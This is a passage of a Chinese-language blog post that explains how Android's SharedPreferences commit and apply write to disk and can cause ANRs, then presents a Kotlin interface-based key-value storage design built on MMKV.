writeToDiskRunnable，HandlerThread 本身也可以保证多个任务执行时的有序性</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">private void enqueueDiskWrite(final MemoryCommitResult mcr,</span><br><span class="line">                              final Runnable postWriteRunnable) &#123;</span><br><span class="line">    final boolean isFromSyncCommit &#x3D; (postWriteRunnable &#x3D;&#x3D; null);</span><br><span class="line">    final Runnable writeToDiskRunnable &#x3D; new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                synchronized (mWritingToDiskLock) &#123;</span><br><span class="line">                    &#x2F;&#x2F;写入磁盘文件</span><br><span class="line">                    writeToFile(mcr, isFromSyncCommit);</span><br><span class="line">                &#125;</span><br><span class="line">                synchronized (mLock) &#123;</span><br><span class="line">                    mDiskWritesInFlight--;</span><br><span class="line">                &#125;</span><br><span class="line">                if (postWriteRunnable !&#x3D; null) &#123;</span><br><span class="line">                    postWriteRunnable.run();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#x2F;&#x2F; Typical #commit() path with fewer allocations, doing a write on</span><br><span class="line">    &#x2F;&#x2F; the current thread.</span><br><span class="line">    if (isFromSyncCommit) &#123; &#x2F;&#x2F;commit() 方法会走进这里面</span><br><span class="line">        boolean wasEmpty &#x3D; false;</span><br><span class="line">        synchronized (mLock) &#123;</span><br><span class="line">            wasEmpty &#x3D; mDiskWritesInFlight &#x3D;&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if (wasEmpty) &#123;</span><br><span class="line">            &#x2F;&#x2F;wasEmpty 为 true 说明当前只有一个线程在执行提交操作，那么就直接在此线程上完成任务</span><br><span class="line">            writeToDiskRunnable.run();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    QueuedWork.queue(writeToDiskRunnable, !isFromSyncCommit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，还有一个比较重要的知识点需要注意下。在 writeToFile 方法中会对本次任务进行校验，避免连续多次执行无效的磁盘任务。当中，mDiskStateGeneration 代表的是最后一次成功写入磁盘文件时的任务版本号，mCurrentMemoryStateGeneration 是当前内存中最新的修改记录版本号，mcr.memoryStateGeneration 是本次要执行的任务的版本号。通过两次版本号的对比，就避免了在连续多次 commit 或者 apply 时造成重复执行 I/O 操作的情况，而是只会执行最后一次，避免了无效的 I/O 任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">@GuardedBy(&quot;mWritingToDiskLock&quot;)</span><br><span class="line">private void writeToFile(MemoryCommitResult mcr, boolean isFromSyncCommit) &#123;</span><br><span class="line">    ···</span><br><span class="line">    if (fileExists) &#123;</span><br><span class="line">        boolean needsWrite &#x3D; false;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Only need to write if the disk state is older than this commit</span><br><span class="line">        &#x2F;&#x2F;判断版本号</span><br><span class="line">        if (mDiskStateGeneration &lt; mcr.memoryStateGeneration) &#123;</span><br><span class="line">            if (isFromSyncCommit) &#123;</span><br><span class="line">                needsWrite &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                synchronized (mLock) &#123;</span><br><span class="line">                    &#x2F;&#x2F; No need to persist intermediate states. Just wait for the latest state to</span><br><span class="line">                    &#x2F;&#x2F; be persisted.</span><br><span class="line">                    &#x2F;&#x2F;判断版本号</span><br><span class="line">                    if (mCurrentMemoryStateGeneration &#x3D;&#x3D; mcr.memoryStateGeneration) &#123;</span><br><span class="line">                        needsWrite &#x3D; true;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!needsWrite) &#123;</span><br><span class="line">            &#x2F;&#x2F;当前版本号并非最新，无需执行，直接返回即可</span><br><span class="line">            mcr.setDiskWriteResult(false, true);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再回过头看 <code>commit()</code> 方法。不管该方法关联的 writeToDiskRunnable 最终是在本线程还是 HandlerThread 中执行，<code>await()</code>方法都会使得本线程阻塞等待直到 writeToDiskRunnable 执行完毕，从而实现了 <code>commit()</code>同步提交的效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">   @Override</span><br><span class="line">   public boolean commit() &#123;</span><br><span class="line">       long startTime &#x3D; 0;</span><br><span class="line">       if (DEBUG) &#123;</span><br><span class="line">           startTime &#x3D; System.currentTimeMillis();</span><br><span class="line">       &#125;</span><br><span class="line">&#x2F;&#x2F;拿到修改后的全量数据</span><br><span class="line">       MemoryCommitResult mcr &#x3D; commitToMemory();</span><br><span class="line">&#x2F;&#x2F;提交写入磁盘文件的任务</span><br><span class="line">       SharedPreferencesImpl.this.enqueueDiskWrite(</span><br><span class="line">           mcr, null &#x2F;* sync write on this thread okay *&#x2F;);</span><br><span class="line">       try &#123;</span><br><span class="line">           &#x2F;&#x2F;阻塞等待，直到 xml 文件写入完成（不管成功与否）</span><br><span class="line">           mcr.writtenToDiskLatch.await();</span><br><span class="line">       &#125; catch (InterruptedException e) &#123;</span><br><span class="line">           return false;</span><br><span class="line">       &#125; finally &#123;</span><br><span class="line">           if (DEBUG) &#123;</span><br><span class="line">               Log.d(TAG, mFile.getName() + &quot;:&quot; + mcr.memoryStateGeneration</span><br><span class="line">                       + &quot; committed after &quot; + (System.currentTimeMillis() - startTime)</span><br><span class="line">                       + &quot; ms&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       notifyListeners(mcr);</span><br><span class="line">       return mcr.writeToDiskResult;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>而对于 <code>apply()</code> 方法，其本身具有异步提交的含义，I/O 操作应该都是交由给了子线程来执行才对，按道理来说只需要调用 <code>enqueueDiskWrite</code> 方法提交任务且不等待任务完成即可，可实际上<code>apply()</code>方法反而要比<code>commit()</code>方法复杂得多<br><code>apply()</code>方法包含一个 awaitCommit 任务，用于阻塞其执行线程直到磁盘任务执行完毕，而 awaitCommit 又被包裹在 postWriteRunnable 中一起提交给了 <code>enqueueDiskWrite</code> 方法，<code>enqueueDiskWrite</code> 方法又会在 writeToDiskRunnable 执行完毕后执行 enqueueDiskWrite</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void apply() &#123;</span><br><span class="line">    final long startTime &#x3D; System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">    final MemoryCommitResult mcr &#x3D; commitToMemory();</span><br><span class="line">    final Runnable awaitCommit &#x3D; new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    &#x2F;&#x2F;阻塞线程直到磁盘任务执行完毕</span><br><span class="line">                    mcr.writtenToDiskLatch.await();</span><br><span class="line">                &#125; catch (InterruptedException ignored) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (DEBUG &amp;&amp; mcr.wasWritten) &#123;</span><br><span class="line">                    Log.d(TAG, mFile.getName() + &quot;:&quot; + mcr.memoryStateGeneration</span><br><span class="line">                            + &quot; applied after &quot; + (System.currentTimeMillis() - startTime)</span><br><span class="line">                            + &quot; ms&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    QueuedWork.addFinisher(awaitCommit);</span><br><span class="line"></span><br><span class="line">    Runnable postWriteRunnable &#x3D; new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                awaitCommit.run();</span><br><span class="line">                QueuedWork.removeFinisher(awaitCommit);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;提交任务</span><br><span class="line">    SharedPreferencesImpl.this.enqueueDiskWrite(mcr, postWriteRunnable);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Okay to notify the listeners before it&#39;s hit disk</span><br><span class="line">    &#x2F;&#x2F; because the listeners should always get the same</span><br><span class="line">    &#x2F;&#x2F; SharedPreferences instance back, which has the</span><br><span class="line">    &#x2F;&#x2F; changes reflected in memory.</span><br><span class="line">    notifyListeners(mcr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单独看以上逻辑会显得十分奇怪，从上文就可以得知 writeToDiskRunnable 最终是会交由 HandlerThread 来执行的，那按照流程看 awaitCommit 最终也是会由 HandlerThread 调用，那么 awaitCommit 的等待操作就显得十分奇怪了，因为 awaitCommit 肯定是会在磁盘任务执行完毕才被调用，就相当于 HandlerThread  在自己等待自己执行完毕。此外，HandlerThread 属于子线程，按道理来说子线程即使执行了耗时操作也不会导致主线程 ANR 才对<br>要理解以上操作，还需要再看看 ActivityThread 这个类。当 Service 和 Activity 的生命周期处于 <code>handleStopService()</code> 、<code>handlePauseActivity()</code> 、<code>handleStopActivity()</code> 的时候，ActivityThread 会调用 <code>QueuedWork.waitToFinish()</code> 方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private void handleStopService(IBinder token) &#123;</span><br><span class="line">    Service s &#x3D; mServices.remove(token);</span><br><span class="line">    if (s !&#x3D; null) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            ···</span><br><span class="line">            &#x2F;&#x2F;重点</span><br><span class="line">            QueuedWork.waitToFinish();</span><br><span class="line">            ···</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            ···</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Slog.i(TAG, &quot;handleStopService: token&#x3D;&quot; + token + &quot; not found.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;Slog.i(TAG, &quot;Running services: &quot; + mServices);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>QueuedWork.waitToFinish() </code>方法会主动去执行所有的磁盘写入任务，并执行所有的 postWriteRunnable，这就造成了 Activity 或 Service 在切换生命周期的过程中有可能因为存在大量的磁盘写入任务而被阻塞住，最终导致 ANR</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">public static void waitToFinish() &#123;</span><br><span class="line">    long startTime &#x3D; System.currentTimeMillis();</span><br><span class="line">    boolean hadMessages &#x3D; false;</span><br><span class="line">    Handler handler &#x3D; getHandler();</span><br><span class="line">    synchronized (sLock) &#123;</span><br><span class="line">        if (handler.hasMessages(QueuedWorkHandler.MSG_RUN)) &#123;</span><br><span class="line">            &#x2F;&#x2F; Delayed work will be processed at processPendingWork() below</span><br><span class="line">            handler.removeMessages(QueuedWorkHandler.MSG_RUN);</span><br><span class="line">            if (DEBUG) &#123;</span><br><span class="line">                hadMessages &#x3D; true;</span><br><span class="line">                Log.d(LOG_TAG, &quot;waiting&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; We should not delay any work as this might delay the finishers</span><br><span class="line">        sCanDelay &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">    StrictMode.ThreadPolicy oldPolicy &#x3D; StrictMode.allowThreadDiskWrites();</span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F;执行所有的磁盘写入任务</span><br><span class="line">        processPendingWork();</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        StrictMode.setThreadPolicy(oldPolicy);</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F;执行所有的 postWriteRunnable</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            Runnable finisher;</span><br><span class="line">            synchronized (sLock) &#123;</span><br><span class="line">                finisher &#x3D; sFinishers.poll();</span><br><span class="line">            &#125;</span><br><span class="line">            if (finisher &#x3D;&#x3D; null) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            finisher.run();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        sCanDelay &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">    synchronized (sLock) &#123;</span><br><span class="line">        long waitTime &#x3D; System.currentTimeMillis() - startTime;</span><br><span class="line">        if (waitTime &gt; 0 || hadMessages) &#123;</span><br><span class="line">            mWaitTimes.add(Long.valueOf(waitTime).intValue());</span><br><span class="line">            mNumWaits++;</span><br><span class="line">            if (DEBUG || mNumWaits % 1024 &#x3D;&#x3D; 0 || waitTime &gt; MAX_WAIT_TIME_MILLIS) &#123;</span><br><span class="line">                mWaitTimes.log(LOG_TAG, &quot;waited: &quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ActivityThread 为什么要主动去触发执行所有的磁盘写入任务我无从得知，字节技术跳动团队给出的猜测是：<strong>Google 在 Activity 和 Service 调用 onStop 之前阻塞主线程来处理 SP，我们能猜到的唯一原因是尽可能的保证数据的持久化。因为如果在运行过程中产生了 crash，也会导致 SP 未持久化，持久化本身是 IO 操作，也会失败</strong><br>综上所述，由于 SP 本身只支持全量更新，如果 SP 文件很大，即使是小数据量的 apply/commit 操作也有可能导致 ANR</p><h1 id="正反面"><a href="#正反面" class="headerlink" title="正反面"></a>正反面</h1><p>SharedPreferencesImpl 在不同的系统版本中有着比较大的差别，例如 writeToFile 方法对于任务版本号的校验也是从 8.0 系统开始的，在 8.0 系统之前对于连续的 commit 和 apply 每次都会触发 I/O 操作，所以在 8.0 系统之前 ANR 问题会更加容易复现。我们需要根据系统版本来看待以上列举出来的各个缺陷</p><p>需要强调的是，SP 本身的定位是轻量级数据存储，设计初衷是用于存储简单的数据结构（基本数据类型），且提供了按模块分区存储的功能。如果开发者能够严格遵守这一个规范的话，那么其实以上所述的很多“缺陷”都是可以避免的。而 SP 之所以现在看起来问题很多，也是因为如今大部分应用的业务比以前复杂太多了，有些时候为了方便就直接用来存储非常复杂的数据结构，或者是没有做好数据分区存储，导致单个文件过大，这才是造成问题的主要原因</p><h1 id="如何做好持久化"><a href="#如何做好持久化" class="headerlink" title="如何做好持久化"></a>如何做好持久化</h1><p>以下的示例代码估计是很多开发者的噩梦</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> sharedPreference = getSharedPreferences(<span class="string">&quot;user_preference&quot;</span>, Context.MODE_PRIVATE)</span><br><span class="line"><span class="keyword">val</span> name = sharedPreference.getString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>以上代码存在什么问题呢？我觉得至少有五点：</p><ul><li>强引用到了 SP，导致后续需要切换存储库时需要全局搜索替换，工作量非常大</li><li>key 值难维护，每次获取 value 时都需要显式声明 key 值</li><li>可读性差，键值对的含义基本只能靠 key 值进行表示</li><li>只支持基本数据类型，在存取自定义数据类型时存在很多重复工作。要向 SP 存入自定义的 - JavaBean 对象时，只能将 Bean 对象转为 Json 字符串后存入 SP，在取值时再手动反序列化</li><li>数据类型不明确，基本只能靠注释来引导开发者使用正确的数据类型</li></ul><p>开发者往往是会声明出各种 SpUtils 类进行多一层封装，但也没法彻底解决以上问题。SP 的确是存在着一些设计缺陷，但对于大部分应用开发者来说其实并没有多少选择，我们只能选择用或者不用，并没有多少余地可以来解决或者避免其存在的问题，我们往往只能在遇到问题后切换到其它的持久化存储方案<br>目前有两个比较知名的持久化存储方案：Jetpack DataStore 和腾讯的 MMKV，我们当然可以选择将项目中的 SP 切换为这两个库之一，但这也不禁让人想到一个问题，如果以后这两个库也遇到了问题甚至是直接被废弃了，难道我们又需要再来全局替换一遍吗？我们应该如何设计才能使得每次的替换成本降到最低呢？<br>在我看来，开发者在为项目引入一个新的依赖库之前就应该为以后移除该库做好准备，做好接口隔离，屏蔽具体的底层逻辑（当然，也不是每个依赖库都可以做到）。笔者的项目之前也是使用 SP 来存储配置信息，后来我也将其切换到了 MMKV，下面就来介绍下笔者当时是如何设计存储结构避免硬编码的</p><blockquote><p>目前的效果</p></blockquote><p>我将应用内所有需要存储的键值对数据分为了三类：用户强关联数据、应用配置数据、不可二次变更的数据。每一类数据的存储区域各不相同，互不影响。进行数据分组的好处就在于可以根据需要来清除特定数据，例如当用户退登后我们可以只清除 UserKVHolder，而 PreferenceKVHolder 和 FinalKVHolder 则可以一直保留<br>IKVHolder 接口定义了基本的存取方法，MMKVKVHolder 通过 MMKV 实现了具体的存储逻辑</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//和用户强绑定的数据，在退出登录时需要全部清除，例如 UserBean</span></span><br><span class="line"><span class="comment">//设置 encryptKey 以便加密存储</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">val</span> UserKVHolder: IKVHolder = MMKVKVHolder(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;加密key&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//和用户不强关联的数据，在退出登录时无需清除，例如夜间模式、字体大小等</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">val</span> PreferenceKVHolder: IKVHolder = MMKVKVHolder(<span class="string">&quot;preference&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//用于存储不会二次变更只用于历史溯源的数据，例如应用首次安装的时间、版本号、版本名等</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">val</span> FinalKVHolder: IKVHolder = MMKVKVFinalHolder(<span class="string">&quot;final&quot;</span>)</span><br></pre></td></tr></table></figure><p>之后我们就可以利用 Kotlin 强大的语法特性来定义键值对了<br>例如，对于和用户强关联的数据，每个键值对都定义为 UserKV 的一个属性字段，键值对的含义和作用通过属性名来进行标识，且键值对的 key 必须和属性名保持一致，这样可以避免 key 值重复。每个 getValue 操作也都支持设置默认值。IKVHolder 内部通过 Gson 来实现序列化和反序列化，这样 UserKV 就可以直接存储 JavaBean、JavaBeanList，Map 等数据结构了</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span> UserKV : IKVHolder <span class="keyword">by</span> UserKVHolder &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> name: String</span><br><span class="line">        <span class="keyword">get</span>() = <span class="keyword">get</span>(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">set</span>(value) = <span class="keyword">set</span>(<span class="string">&quot;name&quot;</span>, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> blog: String</span><br><span class="line">        <span class="keyword">get</span>() = <span class="keyword">get</span>(<span class="string">&quot;blog&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">set</span>(value) = <span class="keyword">set</span>(<span class="string">&quot;blog&quot;</span>, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userBean: UserBean?</span><br><span class="line">        <span class="keyword">get</span>() = getBeanOrNull(<span class="string">&quot;userBean&quot;</span>)</span><br><span class="line">        <span class="keyword">set</span>(value) = <span class="keyword">set</span>(<span class="string">&quot;userBean&quot;</span>, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userBeanOfDefault: UserBean</span><br><span class="line">        <span class="keyword">get</span>() = getBeanOrDefault(</span><br><span class="line">            <span class="string">&quot;userBeanOfDefault&quot;</span>,</span><br><span class="line">            UserBean(<span class="string">&quot;业志陈&quot;</span>, <span class="string">&quot;https://juejin.cn/user/923245496518439&quot;</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">set</span>(value) = <span class="keyword">set</span>(<span class="string">&quot;userBeanOfDefault&quot;</span>, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userBeanList: List&lt;UserBean&gt;</span><br><span class="line">        <span class="keyword">get</span>() = getBean(<span class="string">&quot;userBeanList&quot;</span>)</span><br><span class="line">        <span class="keyword">set</span>(value) = <span class="keyword">set</span>(<span class="string">&quot;userBeanList&quot;</span>, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> map: Map&lt;<span class="built_in">Int</span>, String&gt;</span><br><span class="line">        <span class="keyword">get</span>() = getBean(<span class="string">&quot;map&quot;</span>)</span><br><span class="line">        <span class="keyword">set</span>(value) = <span class="keyword">set</span>(<span class="string">&quot;map&quot;</span>, value)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，我们也可以在 setValue 方法中对 value 进行校验，避免无效值</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span> UserKV : IKVHolder <span class="keyword">by</span> UserKVHolder &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> age: <span class="built_in">Int</span></span><br><span class="line">        <span class="keyword">get</span>() = <span class="keyword">get</span>(<span class="string">&quot;age&quot;</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">set</span>(value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (value &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">set</span>(<span class="string">&quot;age&quot;</span>, value)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后我们在存取值时，就相当于在直接读写 UserKV 的属性值，也支持动态指定 Key 进行赋值取值，在易用性和可读性上相比 SharedPreferences 都有很大的提升，且对于外部来说完全屏蔽了具体的存储实现逻辑</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//存值</span></span><br><span class="line">UserKV.name = <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line">UserKV.blog = <span class="string">&quot;https://juejin.cn/user/923245496518439&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//取值</span></span><br><span class="line"><span class="keyword">val</span> name = UserKV.name</span><br><span class="line"><span class="keyword">val</span> blog = UserKV.blog</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态指定 Key 进行赋值和取值</span></span><br><span class="line">UserKV.<span class="keyword">set</span>(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="keyword">val</span> name = UserKV.<span class="keyword">get</span>(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>如何设计的</p></blockquote><p>首先，IKVHolder 定义了基本的存取方法，除了需要支持基本数据类型外，还需要支持自定义的数据类型。依靠 Kotlin 的 <strong>扩展函数</strong> 和 <strong>内联函数</strong> 这两个语法特性，我们在存取自定义类型时都无需声明泛型类型，使用上十分简洁。JsonHolder 则是通过 Gson 实现了基本的序列化和反序列化方法</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 